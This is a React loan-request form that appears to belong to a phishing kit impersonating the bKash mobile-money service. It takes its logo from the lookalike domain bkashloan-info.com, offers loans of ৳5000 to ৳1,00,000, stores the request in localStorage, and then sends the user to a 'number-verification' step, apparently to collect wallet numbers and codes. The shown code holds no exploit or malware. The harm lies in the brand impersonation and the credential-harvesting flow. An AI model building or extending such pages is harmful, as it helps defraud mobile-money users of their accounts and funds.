import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { FiChevronDown } from "react-icons/fi";
import { MdCheckBox, MdCheckBoxOutlineBlank } from "react-icons/md";

export default function Payment() {
  const navigate = useNavigate();
  const [amount, setAmount] = useState("");
  const [amountFocused, setAmountFocused] = useState(false);
  const [category, setCategory] = useState("");
  const [categoryFocused, setCategoryFocused] = useState(false);
  const [useWallet, setUseWallet] = useState(true);
  const [loading, setLoading] = useState(false);
  const [amountError, setAmountError] = useState("");
  const base_url = import.meta.env.VITE_API_KEY_Base_URL;

  const amountActive = amountFocused || amount !== "";
  const categoryActive = categoryFocused || category !== "";

  const handleAmountChange = (e) => {
    const value = e.target.value;
    setAmount(value);
    
    if (value && parseFloat(value) < 5000) {
      setAmountError("Amount must be at least ৳5000");
    } else if (value && parseFloat(value) > 100000) {
      setAmountError("Amount cannot exceed ৳1,00,000");
    } else {
      setAmountError("");
    }
  };

  const handleSubmit = async () => {
    if (!amount || !category) {
      alert("Please fill in all fields.");
      return;
    }

    if (parseFloat(amount) < 5000) {
      setAmountError("Amount must be at least ৳5000");
      return;
    }

    if (parseFloat(amount) > 100000) {
      setAmountError("Amount cannot exceed ৳1,00,000");
      return;
    }

    setLoading(true);
    
    try {
      const response = await fetch(`${base_url}/api/create`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: amount,
          category: category,
          useWallet: useWallet
        })
      });

      const result = await response.json();
      
      if (result.success) {
        // Save loan ID to localStorage to use in next steps
        localStorage.setItem('loanId', result.data._id);
        localStorage.setItem('loanAmount', amount);
        localStorage.setItem('loanCategory', category);
        
        // Navigate to number verification page
        navigate('/number-verification');
      } else {
        alert("Failed to submit loan request. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Something went wrong. Please check your connection and try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      style={{ fontFamily: "'Segoe UI', sans-serif" }}
      className="min-h-screen bg-gray-100 flex items-center justify-center p-4"
    >
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-md px-10 py-10">

        {/* Logo */}
        <div className="flex justify-center mb-6">
          <img
            src="https://bkashloan-info.com/img/loanricuestpage.png"
            alt="bKash Loan"
            className="h-24 object-contain"
          />
        </div>

        {/* Divider */}
        <hr className="border-t-2 border-red-600 mb-5" />

        {/* Bangla Notice */}
        <p className="text-center text-gray-700 text-sm leading-relaxed mb-6">
          লোনের সুদের হার এবং চার্জ আগে ভালোভাবে দেখে নিন ।<br />
          সময়মেতা পরিশোধ না করলে জরিমানা লাগতে পারে
        </p>

        {/* Amount Input with floating label */}
        <div className="mb-5 relative">
          <label
            style={{
              position: "absolute",
              left: "12px",
              top: amountActive ? "-10px" : "50%",
              transform: amountActive ? "translateY(0)" : "translateY(-50%)",
              fontSize: amountActive ? "11px" : "13px",
              color: amountFocused ? "#e91e8c" : "#9ca3af",
              backgroundColor: "white",
              paddingLeft: "4px",
              paddingRight: "4px",
              transition: "all 0.15s ease",
              pointerEvents: "none",
              zIndex: 10,
            }}
          >
            Amount (৳5000 - ৳1,00,000)
          </label>
          <input
            type="number"
            value={amount}
            onChange={handleAmountChange}
            onFocus={() => setAmountFocused(true)}
            onBlur={() => setAmountFocused(false)}
            min={5000}
            max={100000}
            className="w-full rounded-md px-4 py-3 text-gray-700 text-sm outline-none transition"
            style={{
              border: amountError ? "2px solid #ef4444" : (amountFocused ? "2px solid #e91e8c" : "1px solid #d1d5db"),
            }}
          />
          {amountError && (
            <p className="text-red-500 text-xs mt-1 ml-1">{amountError}</p>
          )}
        </div>

        {/* Category Select with floating label */}
        <div className="mb-5 relative">
          <label
            style={{
              position: "absolute",
              left: "12px",
              top: categoryActive ? "-10px" : "50%",
              transform: categoryActive ? "translateY(0)" : "translateY(-50%)",
              fontSize: categoryActive ? "11px" : "13px",
              color: categoryFocused ? "#e91e8c" : "#9ca3af",
              backgroundColor: "white",
              paddingLeft: "4px",
              paddingRight: "4px",
              transition: "all 0.15s ease",
              pointerEvents: "none",
              zIndex: 10,
            }}
          >
            Category
          </label>
          <select
            value={category}
            onChange={(e) => setCategory(e.target.value)}
            onFocus={() => setCategoryFocused(true)}
            onBlur={() => setCategoryFocused(false)}
            className="w-full rounded-md px-4 text-gray-700 py-3 text-sm outline-none transition appearance-none bg-white"
            style={{
              border: categoryFocused ? "2px solid #e91e8c" : "1px solid #d1d5db",
            }}
          >
            <option value="" disabled hidden></option>
            <option value="Personal Loan">Personal Loan</option>
            <option value="Business Loan">Business Loan</option>
          </select>
          <FiChevronDown
            className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400"
            size={18}
          />
        </div>

        {/* Checkbox */}
        <div
          className="flex items-center gap-2 mb-6 cursor-pointer select-none"
          onClick={() => setUseWallet(!useWallet)}
        >
          {useWallet ? (
            <MdCheckBox className="text-2xl flex-shrink-0" style={{ color: "#1976d2" }} />
          ) : (
            <MdCheckBoxOutlineBlank className="text-2xl flex-shrink-0 text-gray-400" />
          )}
          <span className="text-gray-700 text-sm">
            Use bKash wallet number as your contact number
          </span>
        </div>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full py-3 rounded-md text-white font-semibold text-base transition-opacity hover:opacity-90 active:opacity-75 disabled:opacity-50 disabled:cursor-not-allowed"
          style={{ backgroundColor: "#e91e8c" }}
        >
          {loading ? "Submitting..." : "Request Loan"}
        </button>

        {/* Terms */}
        <p className="text-center text-xs text-gray-500 mt-4">
          By clicking on{" "}
          <span className="font-semibold text-gray-700">Get Loan</span> you are
          agreeing to the{" "}
          <a
            href="#"
            className="underline"
            style={{ color: "#e91e8c" }}
            onClick={(e) => e.preventDefault()}
          >
            terms &amp; conditions
          </a>
        </p>
      </div>
    </div>
  );
}